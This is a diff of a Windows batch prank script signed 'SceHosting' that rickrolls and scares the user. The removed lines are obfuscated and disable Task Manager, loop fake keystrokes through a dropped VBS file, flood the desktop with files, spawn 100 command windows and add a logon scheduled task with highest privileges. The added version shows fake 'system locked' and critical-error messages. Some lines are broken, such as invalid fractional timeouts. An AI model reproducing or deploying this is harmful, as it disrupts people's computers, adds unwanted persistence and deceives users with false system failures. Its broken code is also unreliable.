@@ -1,15 +1,86 @@
 @echo off
-set A=^
-@echo^ off^&s^e^t^ B=^
-@ec^ho^ off
-%A%%B%chcp 65001>nul^&color 0c^&%__APPDIR__%findstr.exe ^"&" ^>%temp%\rr.vbs echo set w=CreateObject^("WScript.Shell"^) ^& echo do ^& echo w.SendKeys^("^"^) ^& echo loop&start /min wscript "%temp%\rr.vbs"
-%A%%B%reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul^&start /min https://www.youtube.com/results?search_query=rickroll
-%A%%B%timeout /t 3 /nobreak >nul^&start https://www.youtube.com/watch?v=dQw4w9WgXcQ
-%A%%B%set/a i=0^&:L^&set/a i+=1^&echo RickRoll>%userprofile%\Desktop\RickRoll_!i!.txt^&if %i% lss 1000 goto L
-%A%%B%for %%i in (1 2 3 4 5 6 7) do (color %%i^&timeout /t 1 /nobreak>nul)
-%A%%B%start /min music.mp3^&timeout /t 10 /nobreak >nul^&reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f >nul
-%A%%B%del /q "%userprofile%\Desktop\RickRoll_*.txt">nul^&echo Merci d'avoir été RickRollé by SceHosting>"%userprofile%\Desktop\RickRoll_Signature.txt"
-%A%%B%timeout /t 5 /nobreak >nul^&color 1f^&echo Votre système a rencontré une erreur. Veuillez patienter...^&timeout /t 5 /nobreak >nul
-%A%%B%color 0c^&start /min music.mp3^&for /l %%i in (1,1,5) do echo BRUITAGE^&timeout /t 1 /nobreak >nul
-%A%%B%echo BOOM^&for /l %%i in (1,1,100) do start cmd^&schtasks /create /tn RickRollCmd /tr %~f0 /sc onlogon /rl highest >nul
-%A%%B%echo Bien joué, je te laisse. >nul^&exit
+title By SceHosting
+mode 1000,50
+color 0a
+setlocal enabledelayedexpansion
+
+set soundPath="%~dp0music.mp3"
+set boomMessage="BOOM! Your system is mine!"
+
+for /l %%C in (1,1,5) do (
+    color 1f
+    timeout /t 1 >nul
+    color cf
+    timeout /t 1 >nul
+)
+
+if exist %soundPath% start "" %soundPath%
+
+cls
+echo SYSTEM FROZEN...
+color 1f
+timeout /t 2 >nul
+
+for /l %%C in (1,1,10) do (
+    color 1f
+    timeout /t 0.5 >nul
+    color cf
+    timeout /t 0.5 >nul
+)
+
+for /l %%X in (1,1,5) do (
+    start cmd /c echo !boomMessage!
+    timeout /t 1 >nul
+)
+
+cls
+echo SYSTEM LOCKED - RESTARTING NOW...
+timeout /t 5 >nul
+
+cls
+echo A critical error occurred. Your system needs to shut down.
+timeout /t 5 >nul
+color 1f
+echo SYSTEM ERROR - RESTARTING NOW...
+timeout /t 5 >nul
+
+for /l %%A in (1,1,5) do (
+    color 0f
+    timeout /t 0.5 >nul
+    color 4f
+    timeout /t 0.5 >nul
+)
+
+cls
+echo SYSTEM INITIATING - DO NOT TURN OFF THE COMPUTER...
+timeout /t 3 >nul
+
+cls
+echo Booting up in safe mode...
+timeout /t 2 >nul
+color 2f
+echo SYSTEM SECURE MODE ACTIVATED
+timeout /t 2 >nul
+
+cls
+echo Final check before launch...
+timeout /t 2 >nul
+color 5f
+echo SYSTEM LAUNCHING...
+timeout /t 2 >nul
+
+cls
+echo SYSTEM ONLINE - WELCOME BACK!
+timeout /t 5 >nul
+exit
+
+:Animate
+set str=%~1
+set "temp="
+for /l %%A in (0,1,250) do (
+    set "temp=!temp!."
+    cls
+    echo %str%!temp!
+    timeout /t 0.1 >nul
+)
+goto :eof
